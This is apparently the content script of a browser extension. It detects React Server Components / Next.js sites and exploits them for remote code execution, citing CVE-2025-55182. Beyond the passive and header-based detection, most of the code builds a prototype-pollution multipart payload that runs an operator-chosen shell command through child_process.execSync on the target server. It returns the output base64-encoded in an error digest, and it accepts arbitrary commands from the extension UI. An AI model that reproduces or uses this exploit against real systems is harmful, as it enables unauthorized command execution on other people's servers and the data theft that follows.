// content.js - RSC detection and exploitation

// === 1. Passive Detection ===
function performPassiveScan() {
    let score = 0;
    let details = [];
    const html = document.documentElement.outerHTML;

    // Check Content-Type for RSC
    if (document.contentType === "text/x-component") {
        score += 100;
        details.push("Found: Content-Type text/x-component");
    }

    // Check for Next.js App Router markers
    if (/(window|self)\.__next_f\s*=/.test(html)) {
        score += 80;
        details.push("Found: window.__next_f (App Router)");
    }

    // Check for React Server DOM webpack
    if (html.includes("react-server-dom-webpack")) {
        score += 30;
        details.push("Found: react-server-dom-webpack");
    }

    // Check for __NEXT_DATA__ (Pages Router - less likely vulnerable but worth noting)
    if (html.includes("__NEXT_DATA__")) {
        score += 10;
        details.push("Found: __NEXT_DATA__ (Pages Router)");
    }

    // Check for Next.js build ID pattern
    if (/\/_next\/static\/[\w-]+\/_buildManifest\.js/.test(html)) {
        score += 20;
        details.push("Found: Next.js build manifest");
    }

    return { isRSC: score >= 50, score: score, details: details };
}

// === 2. Active Fingerprinting ===
async function performFingerprint() {
    try {
        const res = await fetch(window.location.href, {
            method: 'GET',
            headers: { 'RSC': '1' }
        });

        let details = [];
        const cType = res.headers.get('Content-Type') || "";
        const vary = res.headers.get('Vary') || "";
        const text = await res.text();

        if (cType.includes('text/x-component')) {
            details.push("Response Content-Type: text/x-component");
        }
        if (vary.includes('RSC')) {
            details.push("Vary header contains 'RSC'");
        }
        if (/^\d+:["IHL]/.test(text)) {
            details.push("Body matches React Flight Protocol");
        }

        // Check for Next.js specific headers
        const xPoweredBy = res.headers.get('X-Powered-By') || "";
        if (xPoweredBy.toLowerCase().includes('next')) {
            details.push(`X-Powered-By: ${xPoweredBy}`);
        }

        return { detected: details.length > 0, details: details };
    } catch (e) {
        return { detected: false, details: ["Network Error: " + e.message], error: true };
    }
}

// === 3. RCE Exploitation (CVE-2025-55182) ===
async function performExploit(cmd, targetPath) {
    const targetCmd = cmd || "echo vulnerability_test";
    const targetUrl = targetPath || "/adfa";

    // Build payload with prototype pollution
    const payloadJson = `{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\\"then\\":\\"$B1337\\"}","_response":{"_prefix":"var res=process.mainModule.require('child_process').execSync('${targetCmd}').toString('base64');throw Object.assign(new Error('x'),{digest: res});","_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}`;

    const boundary = "----WebKitFormBoundaryx8jO2oVc6SWP3Sad";
    const bodyParts = [
        `--${boundary}`,
        'Content-Disposition: form-data; name="0"',
        '',
        payloadJson,
        `--${boundary}`,
        'Content-Disposition: form-data; name="1"',
        '',
        '"$@0"',
        `--${boundary}`,
        'Content-Disposition: form-data; name="2"',
        '',
        '[]',
        `--${boundary}--`,
        ''
    ].join('\r\n');

    try {
        const res = await fetch(targetUrl, {
            method: 'POST',
            headers: {
                'Next-Action': 'x',
                'X-Nextjs-Request-Id': '7a3f9c1e',
                'X-Nextjs-Html-Request-ld': '9bK2mPaRtVwXyZ3S@!sT7u',
                'Content-Type': `multipart/form-data; boundary=${boundary}`,
                'X-Nextjs-Html-Request-Id': 'SSTMXm7OJ_g0Ncx6jpQt9'
            },
            body: bodyParts
        });

        const responseText = await res.text();
        const statusCode = res.status;

        // Check for common error conditions
        if (statusCode === 404) {
            return {
                success: false,
                msg: `Path not found (404): ${targetUrl}`,
                errorType: "not_found",
                suggestion: "Try a different exploit path"
            };
        }

        if (statusCode === 405) {
            return {
                success: false,
                msg: `Method not allowed (405): POST to ${targetUrl}`,
                errorType: "method_not_allowed",
                suggestion: "This endpoint may not accept POST requests"
            };
        }

        if (statusCode === 403) {
            return {
                success: false,
                msg: `Forbidden (403): ${targetUrl}`,
                errorType: "forbidden",
                suggestion: "Access denied - may require authentication"
            };
        }

        // Extract digest value from response
        const digestMatch = responseText.match(/"digest"\s*:\s*"((?:[^"\\]|\\.)*)"/);

        if (digestMatch && digestMatch[1]) {
            let rawBase64 = digestMatch[1];

            try {
                // Decode JSON escapes, then Base64
                let cleanBase64 = JSON.parse(`"${rawBase64}"`);
                const decodedStr = new TextDecoder().decode(
                    Uint8Array.from(atob(cleanBase64), c => c.charCodeAt(0))
                );

                return {
                    success: true,
                    output: decodedStr,
                    path: targetUrl,
                    command: targetCmd
                };
            } catch (parseError) {
                return {
                    success: false,
                    msg: "Decoding error: " + parseError.message,
                    errorType: "decode_error",
                    debug: rawBase64.substring(0, 50)
                };
            }
        } else {
            // Check if response contains indicators of non-vulnerable app
            if (responseText.includes("<!DOCTYPE") || responseText.includes("<html")) {
                return {
                    success: false,
                    msg: "Target returned HTML - likely not vulnerable",
                    errorType: "not_vulnerable",
                    suggestion: "This doesn't appear to be a vulnerable RSC endpoint"
                };
            }

            return {
                success: false,
                msg: "Exploit failed: 'digest' key not found in response",
                errorType: "no_digest",
                debug: responseText.substring(0, 200),
                statusCode: statusCode
            };
        }

    } catch (e) {
        // Categorize network errors
        if (e.name === 'TypeError' && e.message.includes('Failed to fetch')) {
            return {
                success: false,
                msg: "Request blocked (CORS or network error)",
                errorType: "cors",
                suggestion: "Check if header rules are enabled"
            };
        }

        if (e.name === 'AbortError') {
            return {
                success: false,
                msg: "Request timed out",
                errorType: "timeout"
            };
        }

        return {
            success: false,
            msg: "Network error: " + e.message,
            errorType: "network"
        };
    }
}

// === Message Listener & Initialization ===
const passiveData = performPassiveScan();
if (passiveData.isRSC) {
    chrome.runtime.sendMessage({ action: "update_badge" });
}

chrome.runtime.onMessage.addListener((req, sender, sendResponse) => {
    if (req.action === "get_passive") {
        sendResponse(passiveData);
    }

    if (req.action === "run_fingerprint") {
        performFingerprint().then(res => sendResponse(res));
        return true;
    }

    if (req.action === "run_exploit") {
        performExploit(req.cmd, req.path).then(res => sendResponse(res));
        return true;
    }
});
